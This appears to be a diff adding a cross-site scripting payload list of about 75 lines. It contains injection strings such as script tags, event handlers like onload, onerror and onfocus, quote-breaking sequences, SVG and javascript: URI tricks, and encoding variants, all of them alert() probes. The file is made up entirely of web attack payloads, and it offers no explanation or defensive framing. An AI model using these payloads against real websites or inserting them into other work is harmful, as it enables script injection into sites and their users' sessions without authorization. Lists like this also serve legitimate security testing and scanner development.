@@ -1,0 +1,75 @@
+<script>alert(1)</script>  
+	<img src=1 onerror=alert(7)>
+onmouseover=¡¯alert(9)¡¯
+>"'><script>alert(13)</script>
+"+alert(16)+"
+<body/onfocus=top.alert(17)>
+<svg/onload=alert(91)
+<body onload=alert(140)>
+<body onpageshow=alert(141)>
+<body onfocus=alert(142)>
+<marquee onstart=alert(146)>
+<x oncut=alert(159)>copy this!
+'><script>alert(221)</script>
+='><script>alert(222)</script>
+"><script>alert(233)</script>
+<BODY ONLOAD=alert(245)>
+<br size="&{alert(249)}">
+alert(712))//";alert(712))//--
+<IMG onmouseover="alert(725)">
+\";alert(735);//
+<BODY ONLOAD=alert(742)>
+<BR SIZE="&{alert(744)}">
+¼script¾alert(754)¼/script¾
+<svg/onload=alert(784)
+<svg><script ?>alert(787)
+‘; alert(800);
+‘)alert(801);//
+<ScRiPt>alert(802)</sCriPt>
+<svg/onload=alert(823)
+<svg><script ?>alert(826)
+foo<script>alert(847)</script>
+<BODY ONLOAD=alert(850)>
+javascript:alert(853)
+<BODY ONLOAD=alert(864)>
+\\";alert(878);//
+&lt;BODY ONLOAD=alert(882)&gt;
+žscriptualert(889)ž/scriptu
+d=\"alert(909);\\")\";
+\";alert(943);//
+¼script¾alert(945)¼/script¾
+<frameset onload=alert(960)>
+“><ScRiPt>alert(979)</script>
+foo<script>alert(981)</script>
+‘; alert(983); var foo=’
+foo\’; alert(984);//’;
+<BODY ONLOAD=alert(987)>
+<script>alert(988)</script>
+"><script>alert(989))</script>
+\";alert(1015);//
+<BODY ONLOAD=alert(1023)>
+<BR SIZE="&{alert(1025)}">
+¼script¾alert(1034)¼/script¾
+<svg/onload=alert(1161)
+<svg><script ?>alert(1164)
+\";alert(1649);//
+<BODY ONLOAD=alert(1656)>
+<BR SIZE="&{alert(1658)}">
+¼script¾alert(1668)¼/script¾
+<svg/onload=alert(1698)
+<script>alert(1720))</script>
+<body onLoad="alert(1738);"
+window.alert(1741);
+alert(1742));'))">
+" onfocus=alert(1751) "> <"
+<br size=\"&{alert(1756)}\">
+'); alert(1788); var x='
+\\'); alert(1789);var x=\'
+<BODY ONLOAD=alert(1793)>
+\&quot;;alert(1844);//
+"><script>alert(1868)</script>
+<;BODY ONLOAD=alert(1879)>;
+\";;alert(1913);//
+"><script>alert(1937)</script>
+<BODY ONLOAD=alert(1966)>
+
